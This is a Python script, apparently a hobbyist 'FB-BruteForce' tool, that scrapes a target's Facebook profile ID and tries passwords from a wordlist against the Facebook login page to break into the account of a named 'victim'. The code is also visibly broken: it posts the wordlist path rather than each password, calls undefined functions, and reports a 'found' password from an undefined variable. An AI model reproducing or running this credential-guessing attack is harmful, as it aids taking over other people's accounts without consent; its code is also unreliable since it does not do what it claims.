import sys
import random
import requests
import time
import colorama
from colorama import Fore
import platform
import mechanize
import re
import os
versionPath = "core"+os.sep+"version.txt"
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#########################
print(wi + Fore.BLUE + '''
╔═╗╔╗    ╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗
╠╣ ╠╩╗───╠╩╗╠╦╝║ ║ ║ ║╣───╠╣ ║ ║╠╦╝║  ║╣ 
╚  ╚═╝   ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝╩╚═╚═╝╚═╝ 
       ,--.--._
------" _, \___)
        / _/____) Brute Force Facebook!
        \//(____)
------\     (__)
       `-----"
''')
currentdir = os.getcwd()
error = requests.get('https://facebook.com/login?')
time.sleep(0.1)
print(Fore.GREEN + 'Created By FonderElite || Droid')
print(wi + 'Visit My GitHub Page: https://github.com/FonderElite')
print(wi + 'Visit Our WebSIte: https://singularity.rf.gd')
oof = Fore.RED + platform.system()
time.sleep(2)
time.sleep(1)
sys.stdout.write(Fore.GREEN + '\rLoading.')
time.sleep(1)
sys.stdout.write(Fore.GREEN + '\rLoading...')
time.sleep(1)
sys.stdout.write(Fore.GREEN +'\rLoading....')
time.sleep(1)
sys.stdout.write(Fore.GREEN +'\rLoading......')
time.sleep(1)
sys.stdout.write('\rLoading..........')
time.sleep(1)
flush = sys.stdout.flush()
help = Fore.YELLOW + '''
=============================================
+|            Fb BruteForce                |+
=============================================
+|  M a d e    By    F o n d e r E l i t e |+
+|-----------------------------------------|+
+|      -h          Help                   |+
+|      -id        Id or Email             |+
+|      -w         Wordlist                |+
+|      -g          Get id                 |+
+|      -s          Start                  |+
+|      -u          Update                 |+
+|      -q          Quit                   |+
+|Ex. ./fb -id -w -s (brute-force)         |+       
+|Ex  ./fb -g (Get Profile Id)             |+
 ==========================================='''
errMsg = ""
def infoga():
        try:
            target_profile = input("Input Target's Username: ")
            print(gr + "\n[" + wi + "*" + gr + "] Geting target Profile Id... please wait" + wi)
            time.sleep(1)
            idre = re.compile('"entity_id":"([0-9]+)"')
            con = requests.get("https://facebook.com/" + target_profile).text
            idis = idre.findall(con)
            print(wi + "\n[" + gr + "+" + wi + "]" + gr + " Target Profile" + wi + " ID: " + yl + idis[0] + wi)
        except IndexError:
            print(wi + rd + "[-]" + wi +"Please Check Your Victim's Profile URL")
            sys.exit(1)

def updatefbbrute():
        if not os.path.isfile(versionPath):
         errMsg("Unable to check for updates: please re-clone the script to fix this problem")
         sys.exit(1)
         write("[~] Checking for updates...\n")
         conn = httplib.HTTPSConnection("raw.githubusercontent.com")
         conn.request("GET", "/FonderElite/FB-BruteForce/master/core/version.txt")
         repoVersion = conn.getresponse().read().strip().decode()
        with open(versionPath) as vf:
                    currentVersion = vf.read().strip()
        if repoVersion == currentVersion:
                    write("  [*] The script is up to date!\n")
        else:
            print("  [+] An update has been found ::: Updating... ")
            conn.request("GET", "/FonderElite/Fbbruteforce/master/fbbruteforce.py")
            newCode = conn.getresponse().read().strip().decode()
        with open("fbbruteforce.py", "w") as  fbbruteforce:
                        fbbruteforce.write(newCode)
        with open(versionPath, "w") as ver:
            ver.write(repoVersion)
            write("  [+] Successfully updated :)\n")



try:import requests
except ImportError:
    errMsg("[ requests ] module is missing")
    print("  [*] Please Use: 'pip install requests' to install it :)")
    sys.exit(1)

try:import mechanize
except ImportError:
    errMsg("[ mechanize ] module is missing")
    print("  [*] Please Use: 'pip install mechanize' to install it :)")
    sys.exit(1)
time.sleep(1)
print(Fore.GREEN + 'Done!')
print(help)
print(wi + gr + "Current Directory: " + wi + currentdir)
time.sleep(2)
while True:
 command = input(Fore.RED +  ">"  + oof + "-User: " + wi)
 if command == "./fb -h":
  print(help)

 elif command == "./fb -g":
  infoga()

 elif command == "./fb -u":
  updatefbbrute()

 elif command == "./fb -id -w -s":
  id = input("Enter the Target's Id or Email: ")
  wordlist = input('Input wordlist location: ')
  read = open(wordlist,'r')
  payload = {
        'LogInID':id,
        'Password':wordlist,
         'Log In':'submit'

    }
  for i in read:
   count = 0
   i = i.strip()
   count += 1
   print(wi + rd + '[-]' +  wi + gr + "Trying Password: " + i)
   response = requests.post('https://facebook.com/login?',data=payload)
   print(wi + rd + 'Failed.')
 elif error == "400":
  print(Fore.RED + "Error Occured. Status Code 400 encountered")
  print(Fore.MAGENTA + "BruteForce Failed!")
  pass

 elif "CSRF" or 'csrf' in str(response.content):
  print(Fore.RED + "CSRF Token Detected! or SPACING!")
  exit()
 elif command == "./fbbruteforce -q":
  print(Fore.RED + "(っ◔◡◔)っ ♥ Quitting.... ♥")
  time.sleep(0.2)
  sys.exit()
 else:
  print("Username: " + id)
  print(wi + gr + "[+]" + wi + "Password Found: " + word)
  exit()
#Made By FonderElite
#---------------------------------|+
#| Copyright © 2021 Fonder-Elite  |+
#|  Dont copy use this code       |+
#|  without any notice from it's  |+
#|   Owner.                       |+
#|  Simply Copy Pasting doesn't   |+
#|  make you a good hacker or     |+
#|  programmer.                   |+
#|                                |+
#|--------------------------------|+
